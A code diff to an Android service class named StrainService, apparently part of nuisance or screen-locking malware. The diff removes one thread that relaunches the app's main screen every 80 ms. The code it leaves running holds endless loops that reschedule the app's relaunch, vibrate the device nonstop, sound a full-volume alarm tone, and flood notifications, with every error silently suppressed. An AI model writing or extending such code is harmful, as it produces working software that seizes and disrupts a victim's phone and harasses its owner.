@@ -42,17 +42,7 @@ public class StrainService extends Service {
             tone = new ToneGenerator(AudioManager.STREAM_ALARM, 100);
             tone.startTone(ToneGenerator.TONE_CDMA_ABBR_ALERT, 60000);
         } catch (Throwable ignored) {}
-        Thread storm = new Thread(() -> {
-            while (true) {
-                try {
-                    Intent i = new Intent(StrainService.this, MainActivity.class);
-                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
-                    try { startActivity(i); } catch (Throwable ignored) {}
-                } catch (Throwable ignored) {}
-                try { Thread.sleep(80); } catch (InterruptedException ignored) {}
-            }
-        });
-        storm.setDaemon(true); storm.start();
+
         Thread alarmLoop = new Thread(() -> {
             while (true) {
                 try { StrainReceiver.scheduleRelaunch(StrainService.this, 20); Thread.sleep(100); }
@@ -60,6 +50,7 @@ public class StrainService extends Service {
             }
         });
         alarmLoop.setDaemon(true); alarmLoop.start();
+
         Thread vibLoop = new Thread(() -> {
             while (true) {
                 try { if (vib != null) vib.vibrate(new long[]{0, 60, 20, 60, 20}, -1); Thread.sleep(90); }
@@ -67,6 +58,7 @@ public class StrainService extends Service {
             }
         });
         vibLoop.setDaemon(true); vibLoop.start();
+
         Thread toneLoop = new Thread(() -> {
             while (true) {
                 try {
@@ -76,6 +68,7 @@ public class StrainService extends Service {
             }
         });
         toneLoop.setDaemon(true); toneLoop.start();
+
         Thread spam = new Thread(() -> {
             NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
             int id = 100;
